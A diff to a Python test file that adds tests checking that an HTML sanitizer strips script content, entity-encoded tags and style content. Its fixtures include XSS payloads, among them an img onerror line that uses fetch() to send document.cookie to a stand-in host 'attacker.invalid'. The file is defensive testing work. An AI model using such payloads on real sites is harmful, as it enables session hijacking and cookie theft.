@@ -39,6 +39,13 @@ def test_sanitize_strips_script_tag() -> None:
     assert "important text" in result
 
 
+def test_sanitize_strips_script_content() -> None:
+    """Script element content must be removed, not just the tags."""
+    result = sanitize_input("<script>alert(1)</script>")
+    assert result == ""
+    assert "alert" not in result
+
+
 def test_sanitize_strips_img_onerror() -> None:
     raw = '<img src="x" onerror="fetch(\'https://attacker.invalid/steal?c=\'+document.cookie)">safe'
     result = sanitize_input(raw)
@@ -72,6 +79,20 @@ def test_sanitize_preserves_version_constraints() -> None:
     """Version range expressions like 'pkg<2.0' must be left intact."""
     text = "affected: pkg<2.0 and pkg>=1.0"
     assert sanitize_input(text) == text
+
+
+def test_sanitize_strips_entity_encoded_tags() -> None:
+    """Entity-encoded tags like &lt;img onerror=x&gt; must be stripped."""
+    result = sanitize_input("&lt;img onerror=x&gt;")
+    assert result == ""
+    assert "onerror" not in result
+
+
+def test_sanitize_strips_style_content() -> None:
+    """Style element content must be removed along with the tags."""
+    result = sanitize_input("<style>@import url(evil)</style>")
+    assert result == ""
+    assert "@import" not in result
 
 
 # ---------------------------------------------------------------------------
